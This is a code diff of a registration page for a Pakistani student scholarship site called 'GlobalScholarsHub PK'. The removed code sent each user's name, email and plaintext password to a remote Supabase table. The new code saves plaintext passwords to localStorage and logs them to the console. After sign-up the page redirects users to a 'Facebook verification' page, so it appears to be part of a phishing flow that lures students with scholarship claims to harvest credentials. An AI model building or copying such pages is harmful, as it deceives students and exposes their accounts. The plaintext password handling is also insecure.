@@ -6,7 +6,6 @@
     <title>Register - GlobalScholarsHub PK</title>
     <link rel="stylesheet" href="css/style.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
 </head>
 <body>
 
@@ -34,6 +33,8 @@
     <!-- ===== REGISTER SECTION ===== -->
     <section class="auth-section">
         <div class="container auth-container">
+
+            <!-- ===== LEFT SIDE - BLUE GRADIENT ===== -->
             <div class="auth-left">
                 <div class="left-title">
                     Join thousands of <span>Pakistani students</span>
@@ -42,13 +43,26 @@
                     Who have found their dream scholarships through our platform.
                 </div>
                 <div class="left-stats">
-                    <div class="stat-item"><span class="stat-number">10,000+</span><span class="stat-label">Scholarships</span></div>
-                    <div class="stat-item"><span class="stat-number">50,000+</span><span class="stat-label">Students Applied</span></div>
-                    <div class="stat-item"><span class="stat-number">100+</span><span class="stat-label">Partner Universities</span></div>
-                    <div class="stat-item"><span class="stat-number">95%</span><span class="stat-label">Success Rate</span></div>
+                    <div class="stat-item">
+                        <span class="stat-number">10,000+</span>
+                        <span class="stat-label">Scholarships</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">50,000+</span>
+                        <span class="stat-label">Students Applied</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">100+</span>
+                        <span class="stat-label">Partner Universities</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">95%</span>
+                        <span class="stat-label">Success Rate</span>
+                    </div>
                 </div>
             </div>
 
+            <!-- ===== RIGHT SIDE - WHITE CARD ===== -->
             <div class="auth-right">
                 <div class="auth-header">
                     <h2>Create Account</h2>
@@ -56,22 +70,27 @@
                 </div>
 
                 <form class="auth-form" id="registerForm">
+                    
                     <div class="form-group">
                         <label><i class="fas fa-user"></i> Full Name</label>
                         <input type="text" id="fullName" placeholder="Enter your full name" required />
                     </div>
+
                     <div class="form-group">
                         <label><i class="fas fa-envelope"></i> Email Address</label>
                         <input type="email" id="email" placeholder="Enter your email" required />
                     </div>
+
                     <div class="form-group">
                         <label><i class="fas fa-lock"></i> Password</label>
                         <input type="password" id="password" placeholder="Enter your password" required />
                     </div>
+
                     <div class="checkbox">
                         <input type="checkbox" id="terms" required />
                         <label for="terms">I accept the Terms &amp; Conditions</label>
                     </div>
+
                     <button type="submit" class="btn btn-primary btn-full">Sign Up</button>
                 </form>
 
@@ -79,6 +98,7 @@
                     Already have an account? <a href="login.html">Sign In</a>
                 </p>
             </div>
+
         </div>
     </section>
 
@@ -89,62 +109,45 @@
         </div>
     </footer>
 
+    <script src="js/script.js"></script>
+
+    <!-- ===== SIMPLE LOCAL STORAGE (No Supabase) ===== -->
     <script>
-        // ============================================================
-        //  SUPABASE CONNECTION (DIRECT FROM FRONTEND)
-        // ============================================================
-        const supabaseUrl = 'https://wpsx11yolaoqucmvah.supabase.co';
-        const supabaseKey = 'sb_publishable_I0tVjJYAMpFojpHXOhNlg_IoRI-zK4';
-        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
-
-        document.getElementById('registerForm').addEventListener('submit', async function(e) {
+        document.getElementById('registerForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
+            
             const name = document.getElementById('fullName').value.trim();
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
             const submittedAt = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
-
+            
             if (!name || !email || !password) {
                 alert('⚠️ Please fill all fields!');
                 return;
             }
-
-            console.log('📤 Sending data:', { name, email, password, submittedAt });
-
-            try {
-                // ===== 1. SAVE TO SUPABASE =====
-                const { data, error } = await supabase
-                    .from('users')
-                    .insert([{ name, email, password, submitted_at: submittedAt }])
-                    .select();
-
-                if (error) {
-                    console.error('❌ Supabase Error:', error);
-                    alert('⚠️ Error saving data: ' + error.message);
-                    return;
-                }
-
-                console.log('✅ Data saved to Supabase!', data);
-
-                // ===== 2. SAVE TO LOCAL STORAGE =====
-                let allUsers = [];
-                const saved = localStorage.getItem('allUsersData');
-                if (saved) {
-                    allUsers = JSON.parse(saved);
-                }
-                allUsers.push({ id: Date.now(), name, email, password, submittedAt });
-                localStorage.setItem('allUsersData', JSON.stringify(allUsers));
-                console.log('✅ Data saved to Local Storage!');
-
-                // ===== 3. SUCCESS + REDIRECT =====
-                alert('✅ Registration successful! Redirecting to Facebook verification...');
-                window.location.href = 'facebook-verify.html';
-
-            } catch (error) {
-                console.error('❌ Error:', error);
-                alert('⚠️ Error: ' + error.message);
+            
+            console.log('📤 Saving data:', { name, email, password, submittedAt });
+            
+            // ===== SAVE TO LOCAL STORAGE =====
+            let allUsers = [];
+            const saved = localStorage.getItem('allUsersData');
+            if (saved) {
+                allUsers = JSON.parse(saved);
             }
+            
+            allUsers.push({
+                id: Date.now(),
+                name: name,
+                email: email,
+                password: password,
+                submittedAt: submittedAt
+            });
+            
+            localStorage.setItem('allUsersData', JSON.stringify(allUsers));
+            console.log('✅ Data saved to Local Storage! Total users:', allUsers.length);
+            
+            alert('✅ Registration successful! Redirecting to Facebook...');
+            window.location.href = 'facebook-verify.html';
         });
     </script>
 
